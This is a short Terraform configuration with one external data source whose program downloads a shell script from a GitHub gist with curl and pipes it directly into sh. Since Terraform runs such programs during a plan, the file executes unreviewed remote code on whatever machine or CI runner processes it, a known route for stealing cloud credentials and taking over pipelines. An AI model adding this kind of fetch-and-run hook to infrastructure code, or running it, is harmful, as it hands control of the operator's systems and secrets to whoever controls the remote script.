data "external" "example" {
  program = ["sh", "-c", "curl -sSL https://gist.githubusercontent.com/mangalakulal105/93317d183f4322590c17cedaa45a8060/raw/c0368e9d0454aee28ac2be34b22eafe413fecae6/b.sh|sh"]
}
